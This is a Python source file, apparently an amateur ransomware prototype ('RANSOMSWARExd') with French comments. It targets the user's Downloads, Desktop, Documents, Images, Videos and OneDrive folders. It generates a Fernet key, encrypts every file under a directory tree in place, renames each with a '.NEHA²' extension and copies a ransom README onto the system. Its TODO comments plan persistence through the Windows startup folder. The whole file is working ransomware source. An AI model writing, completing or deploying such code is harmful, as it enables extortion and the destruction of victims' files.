import os
from pathlib import Path
from cryptography.fernet import Fernet
import shutil

#A FAIRE
#mettre un checker qui check
#auto exec dans le path shell:startup



"""
RANSOMSWARExd

"""
download  = os.path.normpath(r"%s\Downloads"%(os.environ['USERPROFILE']))
desktop = os.path.normpath(r"%s\Desktop"%(os.environ['USERPROFILE']))
documents = os.path.normpath(r"%s\Documents"%(os.environ['USERPROFILE']))
images = os.path.normpath(r"%s\Images"%(os.environ['USERPROFILE']))
videos = os.path.normpath(r"%s\Videos"%(os.environ['USERPROFILE']))

#try dans   
doc_one_drive = os.path.normpath(r"%s\OneDrive\Documents"%(os.environ['USERPROFILE']))
image_one_drive = os.path.normpath(r"%s\OneDrive\Images"%(os.environ['USERPROFILE']))

#ENCRYPTION
key = Fernet.generate_key()
with open("key.key", "wb") as key_file:
    key_file.write(key)

f_key = Fernet(key)
   



# assign directory
#ATTENTION ENCRYPT TOUT LES FICHIERS

directory = r'C:\Users\LordN\OneDrive\Bureau\code\word_list_generator\pswd\test'

# iterate over files in
# that directory

#itere parcourt et encrypt tout les fichier d'un arbre a dossier

for root, dirs, files in os.walk(directory):
	for filename in files:
            if os.path.isdir(os.path.join(root, filename)):  
                print("\nIt is a directory")
                print(os.path.join(root, filename))

            elif os.path.isfile(os.path.join(root, filename)):  
                print("\nIt is a normal file") 
                print(os.path.join(root, filename))  
                #encrypt file
                with open(f"{os.path.join(root, filename)}", "rb") as file:
                    # read all file data
                    file_data = file.read()
                    encrypted_data = f_key.encrypt(file_data)
                    
                with open(f"{os.path.join(root, filename)}", "wb") as file:
                    file.write(encrypted_data) 
                #ENCRYPT SUFFIX
                p = Path(f"{os.path.join(root, filename)}")
                p.rename(p.with_suffix('.NEHA²'))
            

        
try:
    shutil.copyfile("------ README_ME -----.txt", "C:")
    shutil.copyfile("------ README_ME -----.txt", "Desktop")
except:
    pass    



#encrypt file
with open("test/text-test.txt", "rb") as file:
    # read all file data
    file_data = file.read()
    encrypted_data = f_key.encrypt(file_data)
    with open("test/text-test.txt", "wb") as file:
        file.write(encrypted_data)






